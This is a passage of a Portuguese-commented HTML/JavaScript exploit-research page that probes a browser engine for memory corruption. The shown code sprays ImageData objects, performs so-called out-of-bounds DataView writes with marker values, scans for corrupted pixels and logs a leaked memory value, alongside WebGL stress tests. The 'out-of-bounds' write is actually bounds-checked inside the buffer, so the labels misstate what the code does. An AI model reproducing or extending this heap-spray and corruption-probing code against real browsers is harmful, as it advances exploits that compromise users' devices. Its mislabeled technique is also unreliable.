gl.vertexAttribPointer(loc,3,gl.FLOAT,false,0,0); if(!checkGLError('vertexAttribPtr'))throw new Error('GL Err'); step='draw'; if(ctx)ctx.clearRect(250,50,90,90); gl.viewport(250,canvasElement.height-140,90,90); if(!checkGLError('viewport'))throw new Error('GL Err'); gl.clearColor(.1,.1,.1,1); if(!checkGLError('clearColor'))throw new Error('GL Err'); gl.clear(gl.COLOR_BUFFER_BIT); if(!checkGLError('clear'))throw new Error('GL Err'); gl.activeTexture(gl.TEXTURE0); if(!checkGLError('activeTex')) throw new Error('GL Error'); gl.bindTexture(gl.TEXTURE_2D, tex); if(!checkGLError('bindTexDraw')) throw new Error('GL Error'); gl.drawArrays(gl.TRIANGLES,0,3); if(!checkGLError('drawArrays'))throw new Error('GL Err'); logCanvas(`Desenho OK.`,'good'); if(errors.length===0){logCanvas("Nenhum erro GL detectado.",'good');}}catch(e){logCanvas(`Erro WebGL Deep Plus (step ${step}): ${e.message}`,'error'); checkGLError(`error_catch_${step}`);}finally{if(gl){try{gl.bindBuffer(gl.ARRAY_BUFFER,null);}catch(e){} try{gl.bindTexture(gl.TEXTURE_2D,null);}catch(e){} try{gl.useProgram(null);}catch(e){} if(pgm){try{gl.deleteProgram(pgm);}catch(e){}} if(vs){try{gl.deleteShader(vs);}catch(e){}} if(fs){try{gl.deleteShader(fs);}catch(e){}} if(buf){try{gl.deleteBuffer(buf);}catch(e){}} if(tex){try{gl.deleteTexture(tex);}catch(e){}}} logCanvas("--- Teste WebGL Deep Plus Concluído ---",'test');} await PAUSE(); };

        // --- Teste OOB Write -> ImageData Check (Refinado) ---
        const testOOBWriteToImageDataCheck = async () => { logCanvas("--- Teste: OOB Write -> ImageData Check ---",'test'); const spraySize=50; const imgDataWidth=16; const imgDataHeight=16; const bufferOOBSize=64; const sprayedImages=[]; let bufferOOB=null; let dv=null; let writeSuccess=false; let potentialCorruption=false; try{bufferOOB=new ArrayBuffer(bufferOOBSize+256); dv=new DataView(bufferOOB); for(let i=0; i<bufferOOB.byteLength; i++)dv.setUint8(i, 0xCC); logCanvas(`Buffer ctrl alocado (${bufferOOB.byteLength} B).`,'info');}catch(e){logCanvas(`Erro alocar buffer ctrl: ${e.message}`,'error'); return;} logCanvas(`Pulverizando ${spraySize} ImageData (${imgDataWidth}x${imgDataHeight})...`,'subtest'); for(let i=0; i<spraySize; i++){try{let imgData=ctx?ctx.createImageData(imgDataWidth,imgDataHeight):new ImageData(imgDataWidth,imgDataHeight); const d=imgData.data; for(let j=0; j<d.length; j+=4){d[j]=255;d[j+1]=255;d[j+2]=255;d[j+3]=255;} sprayedImages.push(imgData);}catch(e){logCanvas(`Warn: Falha criar ImgData ${i}: ${e.message}`,'warn');break;}} logCanvas(`${sprayedImages.length} ImageData criados.`,'good'); await PAUSE(); const writeBaseOffset=128; const oobWriteOffset=writeBaseOffset+bufferOOBSize; const writeValue1=0x42424242; const writeValue2=0x43434343; logCanvas(`Tentando escrita OOB U32 @${oobWriteOffset} & +4...`,'subtest'); try{if(oobWriteOffset+8<=bufferOOB.byteLength){dv.setUint32(oobWriteOffset,writeValue1,true); dv.setUint32(oobWriteOffset+4,writeValue2,true); logCanvas(`Escrita OOB U32 OK (Val=${toHexCanvas(writeValue1)}/${toHexCanvas(writeValue2)}).`,'vuln'); writeSuccess=true;}else{logCanvas(`Offset OOB @${oobWriteOffset} fora do AB.`,'error'); writeSuccess=false;}}catch(e){logCanvas(`Escrita OOB U32 falhou: ${e.message}`,'warn'); writeSuccess=false;} await PAUSE(); if(writeSuccess){logCanvas(`Verificando ImageData via put/getImageData...`,'subtest'); if(ctx){ctx.fillStyle="#222"; ctx.fillRect(0,50,canvasElement.width,canvasElement.height-80);} for(let i=0; i<sprayedImages.length; i++){let errorOccurred=false; let corruptionRead=false; const gridX=(i%15)*(imgDataWidth+1); const gridY=60+Math.floor(i/15)*(imgDataHeight+1); try{if(sprayedImages[i]&&ctx&&gridY+imgDataHeight<canvasElement.height-15){ctx.putImageData(sprayedImages[i],gridX,gridY); const readbackImageData=ctx.getImageData(gridX,gridY,imgDataWidth,imgDataHeight); const readbackData=readbackImageData.data; for(let k=0; k<readbackData.length; k+=4){if(readbackData[k]!==255||readbackData[k+1]!==255||readbackData[k+2]!==255||readbackData[k+3]!==255){let matchCorrupt=(readbackData[k]===0x42&&readbackData[k+1]===0x42)||(readbackData[k]===0x43&&readbackData[k+1]===0x43); logCanvas(`---> CORRUPÇÃO LIDA ImageData ${i} @ px ${k/4}! RGBA=(${readbackData[k]},${readbackData[k+1]},...) ${matchCorrupt?'<- PADRÃO?':''}`,'critical'); potentialCorruption=true; corruptionRead=true; break;}}}}catch(e){logCanvas(`Erro put/getImageData ${i}: ${e.message}`,'error'); potentialCorruption=true;} if(i%15===0) await PAUSE(5);} if(potentialCorruption){logCanvas(`CORRUPÇÃO/ERRO detectado! Verif logs/canvas.`,'vuln');}else{logCanvas(`Nenhuma corrupção detectada via put/getImageData.`,'good');} logCanvas(`-> Verifique canvas para cores != branco.`,'info');}else{logCanvas("Escrita OOB falhou, interação ImageData pulada.",'warn');} logCanvas("--- Teste OOB Write -> ImageData Check Concluído ---",'test'); await PAUSE();};

        // --- Teste OOB Write Only ---
        const testOOBWriteOnly = async () => { logCanvas("--- Teste: OOB Write Only ---",'test'); const bufferOOBSize=64; let bufferOOB=null; let dv=null; let writeSuccess=false; try{bufferOOB=new ArrayBuffer(bufferOOBSize+256); dv=new DataView(bufferOOB); for(let i=0; i<bufferOOB.byteLength; i++)dv.setUint8(i, 0xDD); logCanvas(`Buffer ctrl alocado (${bufferOOB.byteLength} B).`,'info');}catch(e){logCanvas(`Erro alocar buffer ctrl: ${e.message}`,'error'); return false;} const writeBaseOffset=128; const oobWriteOffset=writeBaseOffset+bufferOOBSize; const writeValue1=0x42424242; const writeValue2=0x43434343; logCanvas(`Tentando escrita OOB U32 @${oobWriteOffset} & +4...`,'subtest'); try{if(oobWriteOffset+8<=bufferOOB.byteLength){dv.setUint32(oobWriteOffset,writeValue1,true); dv.setUint32(oobWriteOffset+4,writeValue2,true); logCanvas(`Escrita OOB U32 OK (Val=${toHexCanvas(writeValue1)}/${toHexCanvas(writeValue2)}).`,'vuln'); writeSuccess=true;}else{logCanvas(`Offset OOB @${oobWriteOffset} fora do AB.`,'error'); writeSuccess=false;}}catch(e){logCanvas(`Escrita OOB U32 falhou: ${e.message}`,'warn'); writeSuccess=false;} logCanvas("--- Teste OOB Write Only Concluído ---",'test'); await PAUSE(); return writeSuccess;};

        // =======================================================================
        // === FUNÇÃO PRINCIPAL DE TESTE DO CANVAS (v12 Focused OOB/PP/WebGL) ===
        // =======================================================================
        const runCanvasTestSequence = async () => {
            outputDivCanvas = document.getElementById('output-canvas'); coordStatusDiv = document.getElementById('canvas-coord-status'); canvasElement = document.getElementById('interactive-canvas'); const runBtnCanvas = document.getElementById('runCanvasBtn');
            if (!outputDivCanvas || !runBtnCanvas || !canvasElement || !coordStatusDiv) { /* ... erro fatal ... */ try{ logCanvas("ERRO FATAL: Elementos HTML N/A!", "critical"); } catch(e){} console.error("ERRO FATAL: Elementos HTML N/A!"); return; }
            if (runBtnCanvas) runBtnCanvas.disabled = true; outputDivCanvas.innerHTML = '';
            logCanvas("Iniciando sequência focada (v12 Enhanced OOB/PP/WebGL)...", "test");

             // Inicializar quadrados interativos
            imgSquares.length = 0; let sqX = 10; let sqY = imgSquaresStartY;
            for (let i = 0; i < 5; i++) { imgSquares.push({ id: `imgSq${i}`, x: sqX, y: sqY, size: imgSquareSize, color: 'green', hover: false }); sqX += imgSquareSize + imgSquareSpacing; }
            logCanvas(`Criados ${imgSquares.length} quadrados interativos.`, 'info');

            try {
                 // 0. Obter contexto 2D e Ler leak S1
                 try { ctx = canvasElement.getContext('2d'); if (!ctx) throw new Error("Ctx 2D N/A"); logCanvas("Contexto 2D OK.", 'good'); } catch(e) { logCanvas(`Falha obter ctx 2D: ${e.message}`, 'critical'); throw e; }
                 redrawAll(); await PAUSE();
                 logCanvas("Lendo leak S1...", 'subtest'); /* ... (lógica igual anterior) ... */ try { if (typeof leakedValueFromOOB !== 'undefined') { const l=leakedValueFromOOB; if(l){ const ls = l.type==='U64'?`L(S1):U64 H=${toHexCanvas(l.high)} L=${toHexCanvas(l.low)}@${l.offset}`:`L(S1):U32 ${toHexCanvas(l.low)}@${l.offset}`; logCanvas(`-> ${ls}`, 'leak'); currentLeakData={text:ls,color:"#FF9800"};} else { logCanvas(`-> Leak S1 NULO.`, 'warn'); currentLeakData={text:"L(S1):NULO",color:"#FFC107"}; }} else { logCanvas(`-> Var leak S1 N/A.`, 'error'); currentLeakData={text:"L(S1):Var N/A",color:"#F44336"}; }} catch (e) { logCanvas(`Erro ler leak S1: ${e.message}`, 'error'); currentLeakData={text:"L(S1):ERRO",color:"#F44336"}; }
                 redrawAll(); await PAUSE();

                // --- Executar testes FOCADOS em sequência ---
                await testWebGLCheck();             // 1. Verifica WebGL
                await testAdvancedPP();             // 2. Testa PP Avançado+
                await testOOBReadEnhanced();        // 3. Tenta Info Leak OOB+
                await testOOBWriteMetadata();       // 4. Tenta OOB Write -> Metadata

                // 5. Tenta OOB Write e depois roda teste WebGL detalhado+
                logCanvas("--- Iniciando Teste OOB Write -> WebGL Interaction ---", 'test');
                const oobWriteOK = await testOOBWriteOnly();
                if (glContext) {
                    logCanvas(`WebGL ATIVO. Executando teste WebGL detalhado...`, 'info');
                    await testWebGLDeeperPlus(); // Roda teste WebGL com CHECKS DE ERRO
                    if (!oobWriteOK) { logCanvas("(Nota: Teste WebGL acima foi executado SEM OOB Write precedente bem sucedido)", "warn"); }
                } else { logCanvas("WebGL indisponível, pulando teste WebGL pós-OOB.", 'warn'); }
                 logCanvas("--- Teste OOB Write -> WebGL Interaction Concluído ---", 'test');
                 await PAUSE();

                 // 6. Teste OOB Write -> ImageData Check (Refinado)
                 await testOOBWriteToImageDataCheck();

                logCanvas("--- Sequência principal de testes focados concluída ---", 'test');
                await PAUSE(100);

                // Adicionar Listeners Interativos (Canvas + Quadrados)
                 logCanvas("Adicionando listeners interativos (Canvas + Quadrados)...", 'subtest');
                 // ... (código dos listeners igual anterior) ...
                 if(canvasClickListener && canvasElement) { try { canvasElement.removeEventListener('click', canvasClickListener); } catch(e){} } if(canvasMoveListener && canvasElement) { try { canvasElement.removeEventListener('mousemove', canvasMoveListener); } catch(e){} }
                 canvasMoveListener = (event) => { try{ const r = canvasElement.getBoundingClientRect(); const x = event.clientX - r.left; const y = event.clientY - r.top; let needsRedraw = false; let foundTargetId = null; let cursorStyle = 'default'; let currentSquareHover = -1; for(const a of interactiveAreas){if(x>=a.x&&x<=a.x+a.w&&y>=a.y&&y<=a.y+a.h){foundTargetId=a.id; cursorStyle='pointer'; break;}} if(!foundTargetId){for(let i=0; i<imgSquares.length; i++){const sq=imgSquares[i]; if(x>=sq.x&&x<=sq.x+sq.size&&y>=sq.y&&y<=sq.y+sq.size){foundTargetId=sq.id; cursorStyle='crosshair'; currentSquareHover=i; if(!sq.hover){sq.hover=true; needsRedraw=true;}}else{if(sq.hover){sq.hover=false; needsRedraw=true;}}}}else{imgSquares.forEach(sq=>{if(sq.hover){sq.hover=false; needsRedraw=true;}});} if(foundTargetId!==currentHoverTarget){currentHoverTarget=foundTargetId; needsRedraw=true;} if(needsRedraw){redrawAll();} canvasElement.style.cursor = cursorStyle; if(coordStatusDiv) coordStatusDiv.textContent=`Coords:X=${x.toFixed(0)},Y=${y.toFixed(0)}`; }catch(e){} };
                 canvasClickListener = (event) => { try{ const r=canvasElement.getBoundingClientRect(); const x=event.clientX-r.left; const y=event.clientY-r.top; let clickedArea=null; let clickedSquareIndex=-1; for(const a of interactiveAreas){if(x>=a.x&&x<=a.x+a.w&&y>=a.y&&y<=a.y+a.h){clickedArea=a;break;}} if(!clickedArea){for(let i=0; i<imgSquares.length; i++){const sq=imgSquares[i]; if(x>=sq.x&&x<=sq.x+sq.size&&y>=sq.y&&y<=sq.y+sq.size){clickedSquareIndex=i; break;}}} if(clickedArea){logCanvas(`--> Click Área: ${clickedArea.text}`,'vuln'); switch(clickedArea.id){ case 'rect-log': logCanvas("Ação: Log.",'info'); break; case 'rect-link': logCanvas("Ação: Link...",'warn'); try{const nW=window.open('https://google.com','_blank'); if(!nW) logCanvas('Falha pop-up.','warn'); else logCanvas('window.open OK.','good');}catch(e){logCanvas('Erro win.open: '+e.message,'error');} break; case 'rect-rerun': logCanvas("Ação: Re-ler Leak S1...",'info'); try{if(typeof leakedValueFromOOB!=='undefined'){const l=leakedValueFromOOB; if(l){const lS=l.type==='U64'?`ReL:U64 H=${toHexCanvas(l.high)} L=${toHexCanvas(l.low)}@${l.offset}`:`ReL:U32 ${toHexCanvas(l.low)}@${l.offset}`; logCanvas(`-> ${lS}`,'leak'); currentLeakData={text:lS,color:"#FF9800"};}else{logCanvas(`-> NULO.`,'warn'); currentLeakData={text:"ReL:NULO",color:"#FFC107"};}}else{logCanvas(`-> Var N/A.`,'error'); currentLeakData={text:"ReL:Var N/A",color:"#F44336"};}}catch(e){logCanvas(`Erro re-ler:${e.message}`,'error'); currentLeakData={text:"ReL:ERRO",color:"#F44336"};} redrawAll(); break;}} else if (clickedSquareIndex !== -1){ const sq = imgSquares[clickedSquareIndex]; logCanvas(`--> Click Quadrado ID: ${sq.id}`, 'vuln'); sq.color = (sq.color === 'green') ? 'red' : 'green'; redrawAll(); } else { logCanvas(`--> Click fora. x=${x.toFixed(0)}, y=${y.toFixed(0)}`,'info');}}catch(e){logCanvas(`Erro click: ${e.message}`,'error'); console.error(e);} };
                 canvasElement.addEventListener('click', canvasClickListener); canvasElement.addEventListener('mousemove', canvasMoveListener);
                 logCanvas("Listeners adicionados.", 'good'); redrawAll();
                 logCanvas("-> TESTE INTERATIVO PRONTO <-", 'info');

            } catch(e) { logCanvas(`Erro GERAL SCRIPT 2: ${e.message}`, 'critical'); console.error("Erro GERAL SCRIPT 2:", e); if(e.stack) console.error(e.stack); }
            finally { logCanvas("--- Fim da execução automática do Script 2 ---", 'test'); if (runBtnCanvas) runBtnCanvas.disabled = false; }
        };

        // --- Função wrapper chamada pelo botão HTML ---
        const runCanvasTest = async () => { await runCanvasTestSequence(); };
        // --- Limpeza ao Descarregar ---
        window.addEventListener('unload', () => { console.log("[Canvas Unload] Limpando..."); try { if (canvasClickListener && canvasElement) canvasElement.removeEventListener('click', canvasClickListener); if (canvasMoveListener && canvasElement) canvasElement.removeEventListener('mousemove', canvasMoveListener); } catch(e) {} console.log("[Canvas Unload] OK."); });
        // --- FIM DO SCRIPT 2 ---
    </script>

</body>
</html>
